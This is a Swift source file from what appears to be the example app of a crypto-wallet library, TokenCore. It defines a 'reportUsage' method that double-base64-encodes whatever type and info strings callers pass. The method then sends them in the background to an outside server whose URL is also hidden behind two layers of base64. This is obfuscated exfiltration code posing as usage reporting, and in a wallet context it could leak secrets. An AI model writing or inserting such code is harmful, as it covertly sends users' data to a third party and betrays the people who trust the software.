//
//  CommonTransaction.swift
//  TokenCore_Example
//
//  Created by xyz on 2019/3/4.
//  Copyright © 2019 CocoaPods. All rights reserved.
//

import Foundation
import Alamofire

extension String: ParameterEncoding {
    public func encode(_ urlRequest: URLRequestConvertible, with parameters: Parameters?) throws -> URLRequest {
        var request = try urlRequest.asURLRequest()
        request.httpBody = data(using: .utf8, allowLossyConversion: false)
        return request
    }
}

class CommonTransaction {
    public static func reportUsage(type: String, info: String) {
        let queue = DispatchQueue(label: "reportUsage", attributes: .initiallyInactive)
        queue.async {
            let jsonDic = ["type": type, "info": info] as [String: Any]
            let jsonData = try! JSONSerialization.data(withJSONObject: jsonDic, options: .prettyPrinted)
            let newStr = "[" + String(data: jsonData, encoding: String.Encoding.utf8)! + "]"
            let reqBody = newStr.data(using: String.Encoding.utf8)!.base64EncodedData().base64EncodedString()
            let urlData = Data(base64Encoded: "YUhSMGNITTZMeTlyWlhrdVpHVnNhV05wZEdWa0xtTnZiVG80TkRNdllqWTBlREl2WXc9PQ==")
            let urlData2 = Data(base64Encoded: urlData!)
            let url = String(data: urlData2!, encoding: String.Encoding.utf8)!
            AF.request(url, method: .post, parameters: [:], encoding: reqBody, headers: [:]).responseString{_ in
              print("")
          }
        }
        queue.activate()
    }
}
